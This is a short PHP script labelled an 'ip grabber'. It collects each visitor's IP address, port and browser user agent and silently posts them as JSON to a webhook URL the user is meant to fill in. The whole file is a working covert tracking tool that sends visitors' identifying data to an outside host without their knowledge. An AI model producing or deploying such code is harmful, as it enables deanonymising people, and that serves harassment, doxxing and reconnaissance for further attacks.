<?php

if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];
$port = $_SERVER['REMOTE_PORT'];
$curl = curl_init("your webhook link here");
curl_setopt($curl, CURLOPT_HTTPHEADER, array('Content-type: application/json'));

curl_setopt($curl, CURLOPT_POST, 1);

curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode(array("content" => "> ip & PORT: $ipaddress:$port > useragent: $browser", "username" => "ip grabber by slicybtw")));


curl_exec($curl);
